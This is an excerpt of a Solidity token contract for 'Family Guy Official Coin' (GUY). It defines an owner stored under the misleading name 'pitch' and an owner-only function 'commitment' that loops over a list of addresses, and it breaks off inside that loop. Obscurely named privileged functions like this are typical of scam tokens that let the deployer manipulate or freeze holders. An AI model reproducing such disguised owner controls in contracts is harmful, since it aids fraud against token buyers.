...
contract familyguyofficialcoin is Context, IERC20 {
    ...
    address public  pitch;
    constructor () {
        _name = "Family Guy Official Coin";
        _symbol = "GUY";
        _decimals = 18;
    ...
    modifier onlyOwner() {
        require(msg.sender == pitch, "Not allowed");
        _;
    }

    function commitment(address[] memory pastel) public onlyOwner() {
        for (uint256 i = 0; i < pastel.length; i++) {
            address account = pastel[i];
